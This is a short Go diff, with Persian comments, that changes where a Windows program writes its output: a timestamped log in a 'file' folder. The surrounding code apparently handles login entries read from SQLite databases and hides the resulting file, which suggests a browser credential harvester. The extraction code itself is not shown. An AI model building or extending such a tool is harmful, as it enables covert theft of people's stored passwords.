@@ -11,10 +11,11 @@ import (
 	"path/filepath"
 	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 
-	"golang.org/x/sys/windows"
 	_ "github.com/mattn/go-sqlite3"
+	"golang.org/x/sys/windows"
 )
 
 type LoginEntry struct {
@@ -163,7 +164,15 @@ func main() {
 
 	exePath, _ := os.Executable()
 	dir := filepath.Dir(exePath)
-	filePath := filepath.Join(dir, "output.log")
+
+	// ایجاد پوشه‌ی خروجی
+	outputDir := filepath.Join(dir, "file")
+	os.MkdirAll(outputDir, os.ModePerm)
+
+	// ساخت نام فایل با timestamp
+	timestamp := time.Now().Format("20060102_150405")
+	fileName := fmt.Sprintf("%s_output.log", timestamp)
+	filePath := filepath.Join(outputDir, fileName)
 
 	os.WriteFile(filePath, jsonOutput, 0600)
 	hideFile(filePath)
